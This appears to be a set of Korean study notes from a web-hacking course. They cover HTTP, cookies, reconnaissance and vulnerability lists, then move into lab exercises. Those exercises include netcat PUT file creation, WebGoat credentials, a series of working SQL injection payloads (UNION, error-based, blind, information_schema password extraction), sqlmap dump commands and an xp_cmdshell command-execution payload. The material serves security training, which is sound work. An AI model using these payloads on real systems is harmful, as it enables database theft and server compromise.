# Web Hacking

## 월드 와이드 웹(World Wide Web, WWW, W3)
*  인터넷에 연결된 컴퓨터를 통해 사람들이 정보를 공유할 수 있는 전 세계적인 정보 공간 - 일반적인 의미
* 인터넷에서 HTTP 프로토콜, 하이퍼텍스트, HTML형식 등을 사용하여 그림과 문자를 교환하는 전송방식 - 기술적 의미

---
### archive.org
* 정보 수집에 이용할 수 있음


---
### SSS(Server Side Script)
* asp, php, jsp 등

### CSS(Client Side Script)
* HTML, Javascript, 비쥬얼베이직 스크립트 등

### __*모든 보안 조치는 CSS가 아니고 SSS에서 해야함!*__

---
## HTTP 프로토콜
* Wep Proxy
    - fiddler, burp suite

### HTTP(Hyper Text Transfer Protocol)
* 인터넷에서 쓰이는 핵심 프로토콜
* 요청 응답 형식으로 동작
* 오늘날 주로 사용되는 버전은 1.1
* 비연결지향성 프로토콜

===================================
#### http 1.0
* 단순한 동작이 반복적으로 발생
* 필요없는 연결수립과 연결 종료과정발생

#### http 1.1
* 지속적인 연결의 필요성, 가상 호스트, 계층적 프록시 등등에서 HTTP 1.0 보다 개선

#### http 2.0
* 속도 개선, 다중연결, 병령 연결


## HTTP Request 구조
``` 
 Request Line(Start Line)
 Headers
 공백
 Body
```
* Request Line(StartLine:요청, Status Line: 응답)
    - 메소드 URL HTTP Version
    - POST /sam/status.cgi HTTP/1.1

* Headers에는 메타정보가 들어있음
    - Cookie : 쿠키 값
    - Host : utl주소상에 나타나는 호스트명
    - user-agent : 클라이언트가 사용하는 브라우저나 기타소프트웨어 정보
    - Referer : 접속하는데 참고한 url

===================================================
### Method
* __GET__ : 지정된 URL 정보를 요청
    - 전달해야 하는 파라메터를 URL에 포함시켜서 전달
    - GET으로 보내는 파라미터는 길이제한이 있음
        + 요즘 브라우저는 그렇게 제한되어 있지는 않음
실제로 보여주기
* __POST__ : 지정된 URL 정보를 요청 
    - 전달해야 하는 파라메터를 메시지 본문(Request Message Body) = HTTP 바디를 통해서 전달
    - 보안적으로 약간 더 안전(id,password 생각)
        + 그렇다고 보안적으로 안전한건 아님
    - POST로 보내는 파라미터는 길이제한이 없다.     
        + 그렇다고 무한정보낼수 있다는건 아님
* HEAD : HTTP Header 정보만 응답으로 요청한다.
* TRACE : 클라이언트의 요청을 그대로 응답
    - Request의 Loop Back 테스트
* DELETE : 요청하는 URL의 자원을 삭제
* OPTIONS : 서버에서 지원하는 HTTP 메소드 정보를 요청
* PUT : 요청하는 URL의 자원을 생성
    - Ex) 파일 업로드가 가능

### HTTP Response 상태 코드(웹 서버의 응답코드)
``` 
 Status Line
 Headers
 공백
 Body
```
* Status Line
    - httpVersion 상태코드 상태문구정의
    - HTTP/1.1 200 ok

```
- 100~199 : 단순한 정보
- 200~299 : Client의 요청이 정상적으로 처리됨
- 300~399 : Client의 요청이 수행되지 않아 다른 URL로 재지정
- 400~499 : Client의 요청이 불완전하여 다른 정보가 필요함
- 500~599 : Server의 오류로 Client의 요청 수행 불가
```
* 200 : OK : 클라이언트의 요청이 성공함
* 400 : Bad Request : 클라이언트가 서버에 잘못된 요청을 함
* 401 : Unauthorized : 클라이언트가 HTTP 인증을 받아야 함
* 403 : Forbidden, Server가 Client에게 권한을 주지않는 상태
* 404 : Not Found, 지정한 문서가 존재하지 않음
* 500 : Internal Server Error
        Server의 일부가 멈췄거나 설정에서 오류 발생
* 503 : Service Unavailable
        최대 Session 수를 초과하는 등 웹서비스가 불가능한 경우

상태코드는 100퍼센트 정확한 것은 아니다.

#### 메소드 실습(OPTIONS, PUT)
* options 메소드로 정보 수집
```cmd
.\nc.exe 70.12.113.49 8081
OPTIONS / HTTP/1.1
host:70.12.113.49
```
* put 메소드로 파일 생성
```
.\nc.exe 70.12.113.49 8081
PUT /chapter5/tester.html HTTP/1.1
host: 70.12.113.49
Content-length: 20
theFlower go go go!
```

---
## URL 구조  
`https://www.google.co.kr/search?source=hp&ei=TnszX9DGFIT7wQPS34vwBQ&q=adsadasd&oq=adsadasd&gs_lcp=CgZw`  
* 프로토콜 : 서버와 어플리케이션이 통신하기 위한 통신 규약
* 서버이름 : 서버의 hostname 또는 ip 주소
* 포트 : 브라우저와 통신하기 위해 열려있는 서버의 포트
* 파일경로 : 서버내에서 자원의 위치 디렉터리/파일명
* 파라미터 : 동적으로 결과를 생성하는 어플리케이션에 전달하는 값

#### URL 파라미터 메타문자
* ? : URL의 파일 경로 뒤에 붙어 파라미터를 전달할 때 사용
* = : 파라미터 항목과 값을 연결
* & : 복수의 파라미터를 연결
* % : URL인코딩
* \+ : 공백

#### 인코딩
* 내용은 같은나 데이터의 형태를 바꾸는 방식
    - 암호화는 아님
##### 웹에서 사용하는 인코딩
* URL 인코딩
    - URL 특정문자나 문자열을 표현하기 위해 %뒤에   문자의 HEX코드를 붙임
* BASE64 인코딩
    - 64 + 1개의 문자로 구성하여 인코딩
    - 2진수 데이터를 ASCII형태의 텍스트로 표현가능
    - web인증 중 기본인증에 사용
    - 끝부분에 padding(=)이 붙음, '=':2bit
    - 64개의 문자를 사용 (영문 대(26) 소(26) 숫자(10) + / )
    - 데이터를 6bit단위로 표현

---
### WebGoat 접속
* 192.168.195.132:8080/WebGoat/attack
* webgoat/webgoat

### WebGoat 테스트
* 접근제어 취약점 ( 불충분한 인증, 불충분한 인가 ...)
    - 공격 방법 : 강제 브라우징(dirbuster), 파라미터 변조, 쿠키 변조

* CRUD METRIX (웹 개발 매커니즘)    # ex) 게시판
    - CREATE : 등록, 회원가입, 쓰기 -> new, write        
    - READ :  조회, 뷰  -> read, content, view, search
    - UPDATE : 수정 -> modify, update, edit
    - DELETE : 삭제 -> del, delete, remove

* 강제 브라우징에 사용할 값
    - /admin, /manager, /configure, /conf, ....

---
## Cookie
* 클라이언트에 저장되어 서버에서 활용하는 상태정보
    - Persistent Cookie
        + 디스크에 저장
        + 초기 접속시 전송
        + Expiration date가 지나거나 Cookie 삭제시 만료
        + 사용자 재방문시 속성 등을 저장(팝업창 제한, ID/PWD, 장바구니 등)
    - Session Cookie
        + 브라우저 메모리 공간에 저장
        + 초기 접속 전송되니 않음
        + 브라우저를 종료하거나 set-cookie로 cookie가 클리어시 만료
        * 사용자 접속시 인증정보 유지를 위하여 사용(로그인 등)
* Set-Cookie
    - 쿠키이름:쿠키값;Exipires=날짜;Path=경로;Secure,HttpOnly

---
## Session 
* 연결된 상태를 뜻하는 네트워크 용어
* 정보를 서버에 저장

### 세션ID(세션 식별자)
* 대부분 정보는 세션으로 서버에 저장하지만, 인증하기 위한 정보는 쿠키로 저장함 => 세션ID

---
### 쿠키 조작 플러그인
* 인터넷 익스플로러 : cooxie toolbar
* 크롬 브라우저 : editthiscookie


---
## 웹 해킹

* 공격대상 선정 - 정보수집 - 취약점 분석 - 공격 - 보고서

### 정보수집
* whois
* archive.org
* netcraft.com
* wappalyzer

* 크롤링
* 웹서핑
* 개발자 도구

* 구글 해킹
    - site: 특정 도메인으로 지정한 사이트에서 검색하려는 문자열이 포함된 사이트를 찾음
    - filetype: 특정파일 타입에 한해서 검색하려는 문자가 들어있는 사이트를 찾음
    - link: 링크에 검색하려는 문자가 들어있는 사이트를 찾음
    - cache: 특정 검색어에 해당하는 캐쉬된 페이지를 보여줌
    - intitle: 페이지의 제목에 검색하려는 문자가 들어 있는 사이트를 찾음
    - inurl: 페이지의 url에 검색하려는 문자가 들어있는 사이트를 찾음
    - intext: 페이지의 text안에서 검색하려는 문자가 들어있는 사이트를 찾음
    - Ex) intitle:index.of, intilte:index.of 영화m db_conn.inc site:co.kr, 문의 inurl:modify.asp, site:naver.com inurl:admin
    - robots.txt : 구글에 검색이 안되게 함

* exploit-db.com

---
### 취약점 리스트
* 대표적인 취약점 리스트
    - *CWE*
        + 미국국방성 산하 Mitre라는 기관에서 일반적으로 널리 통용되는 주요 취약점, 보안상의 문제들을 나열하여 정리한 목록
        + cwe.mitre.org

    - __CVE__
        + MITRE 및 몇몇 벤더사(MS,GOOGLE,CISCO,APPLE 등등)등이 함께 시간에 따라 감지된 보안취약점 또는 위험노출을 정리해둔 목록
        + 표기 방식 : CVE + 취약점이 발견된 년도 + 취약점 고유번호

    - __OWASP TOP 10__
        + OWASP : 웹 어플리케이션 보안에 대한 자발적인 온라인 정보 공유 민간단체 사이트
        + OWASP에서 3년주기로 10대 취약점을 발표(CVE를 기반)

* 국내
    - 국정원 8대 취약점
    - 행안부 안전가이드
    - 시큐어코딩 가이드
    - __주요기반시설취약점진단가이드__

---
### 해킹 기술 실습
* SQL 인젝션
    - 웹 어플리케이션이 데이터베이스에 날리는 SQL을 개발자가 의도하지 않은 형태로 조작하여 공격하는 기법

#### <간단한 논리적 취약점을 이용한 SQL 인젝션 실습>
```
select * from member where id='사용자입력id' and pwd='사용자입력pwd';

id : ' or '1'='1'--

-- : oracle, MSSQL의 주석처리
# : MYSQL의 주석처리

select * from member where id='' or '1'='1'--

select * from member where (id='' and pwd='');

' or 1=1)--
```
참고 : http://coashanee5.blogspot.com/2017/02/sql.html

### <에러기반 SQL 인젝션> 
* 응답 에러 메시지를 통해 정보를 획득하여 공격하는 SQL 인젝션 공격 기법
```
' and db_name()=0--     # db 이름 알아내기
' and @@version=0--     # dbms 버전정보 알아내기
' and @@servicename=0-- # db 서비스 이름 알아내기
```

#### having 구문과 group by 구문을 이용한  SQL 인젝션
```
' having 1=1--
-> 에러발생 및 DB테이블이름(chapter1), 컬럼명(idx) 확득
"chapter1.idx"

' group by chapter1.idx--
' group by chapter1.idx, level_idx--
...
' group by chapter1.idx, level_idx, ref_idx, title, name, wtday, hitcnt--

----------------------------------------
' group by member.m_idx, m_id, m_name--
DB Table Name : member
Column Name : m_idx, m_id, m_name
```

#### <UNION SQL Injection>
* Union 구문을 사용하면 테이블 두 개의 내용이 동시에 출력가능하고 이를 통해 공격자가 알고 있는 DB의 테이블 데이터를 조회하여 출력할 수 있다.

##### UNION SQL Injection의 조건
1. UNION으로 연결할 양쪽의 컬럼갯수가 같아야 함
2. 같은 위치의 컬럼의 타입이 다를 경우 에러가  발생할 수 있음
3. 컬럼의 이름이 정확해야 함
```
' union select NULL,NULL,NULL,NULL,NULL,NULL,NULL from member--

' union select 1,1,1,NULL,NULL,NULL,NULL from member--

' union select 1,1,1,m_id,m_name,NULL,NULL from member--

' union select 1,1,1,m_id,m_name,NULL,NULL from member where m_id > 'b'--

' union select 1,1,1,m_id,m_pwd,NULL,NULL from member--
```
#### <information_schema를 사용한 SQL 인젝션 공격기법>
* MYSQL, MSSQL의 경우, information_schema 데이터베이스에 전체 DB 정보가 저장됨
* information_schema.columns 테이블을 조회할 경우 전체DB의 테이블명, 컬럼명을 조회할 수 있음(table_name, column_name)
* union select에 information_schema.columns의 항목을 포함시켜 DB정보 파악

```
' union select 1,1,1,table_name,column_name,NULL,NULL from information_schema.columns--
-> 테이블 명, 컬럼 명 출력

' union select 1,1,1,table_name,NULL,NULL,NULL from information_schema.columns--
-> 테이블 명만 출력
-> member 테이블 확인

' union select 1,1,1,column_name,NULL,NULL,NULL from information_schema.columns where table_name='member'--
```
#### <blind SQL Injection>
* 정의 : 쿼리 결과(참,거짓)에 따라 정보를 획득하여 공격하는 기법

```
attacker' and 1=1--   -> 로그인 성공

attacker' and 1=2--   -> 로그인 실패
```
`substring('abcdef',1,2);`  
* abcdef 중 ab 반환

```
attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('a')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('l')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('m')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) = ASCII('l')--
-- 2번째 글자 확인 -------------------------
attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),2,1)) >= ASCII('a')--
...
lecture
```
* 실제론 자동화 툴 사용

==========================================
### 실무 팁
* %' and '1%'='1     %' and '1%'='2
* %' and 'a%'='a     %' and 'a%'='b

* ' and '1'='1 
* ' and '1'='1'
==========================================
### SQL MAP
```
sqlmap.org


OS,DBMS
python sqlmap.py -r 1.txt -p keyword

DB 찾기
python sqlmap.py -r 1.txt --dbs -p keyword

테이블 찾기
python sqlmap.py -r 1.txt -D board --tables -p keyword

member

컬럼 찾기
python sqlmap.py -r 1.txt -D board -T member --columns -p keyword

내용 덤프
python sqlmap.py -r 1.txt -D board -T member -C bId,bName,bPass --dump -p keyword

bId,bName,bPass
```

---
## Stored Procedure SQL Injection
* DBMS에서 관리 목적으로 사용되는 Stored Procedure(저장 프로시저)를 공격자가 호출하여 시스템 명령 수행 등을 수행할 수 있는 공격

### MS-SQL
* xp_cmdshell : 관리자 권한으로 시스템 명형어를 실행  
`'; exec master.dbo_xp_cmdshell 'ipconfig /all > D:\wwwroot\board\ip.txt'--`

---
## 데이터 평문 전송
* http를 써서 중요정보를 전송하면 취약점
    - 중요정보(password, 주민등록번호.....)
* 해결책: https
* __*burp 사용 금지, 와이어샤크를 사용해야 함!!!*__

---
## 자동화 공격
* 툴을 이용해서 자동화 공격

대응방안
    - Captcha
    - 같은 ip에서 여러번 요청 방지
    - 패스워드 5번 이상 틀리면 계정잠금

---
## 정보누출 취약점
* 부적절한 에러메시지 처리
* 마스킹 처리 미흡
* 값이 이미 하드코딩된 경우
* 404, 403 등 예러페이지가 동일하지 않은 경우
* 주석처리를 잘하지 못한 경우
* 클라이언트 사이드에서 필처링하는 겨우
* 백업 파일을 지우지 않은 경우, 기본 페이지를 지우지 않는 경우
    - test.jsp
    - download.asp.bak
    - index.php.bak
    - zip, tar.gz, txt
* http 응답 패킷의 배너그래빙
* db에러메시지
* db에 중요정보를 암호화하지 않고 저장하는 경우
* 등등등